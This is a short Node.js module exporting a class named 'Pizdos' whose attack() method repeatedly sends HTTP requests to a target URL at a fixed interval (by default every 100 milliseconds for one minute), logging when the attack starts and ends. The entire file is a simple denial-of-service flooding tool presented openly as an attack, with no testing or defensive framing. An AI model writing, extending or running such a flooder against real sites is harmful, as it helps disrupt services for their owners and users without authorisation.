const request = require('request')

module.exports = class Pizdos {
    /**
     * Starts attack on url using options.
     * @param {string} url 
     * @param {object} options
     * @public
     */
    static attack(url, options) {
        options = Object.assign(this.standardOptions, options)

        options.log(`Attack started at ${new Date}.`)
        
        setInterval(() => {
            request(url, error => {
                if (error) throw 'Attack ended with an error.\n' + error
            })
        }, options.frequency)
        
        setTimeout(() => {
            options.log(`Attack complete at ${new Date}.`)
            process.exit(0)
        }, options.duration)
    }

    /**
     * Constant with standard options.
     * @private
     */
    static get standardOptions() {
        return {
            duration: 60000,
            frequency: 100,
            log: console.log
        }
    }
}
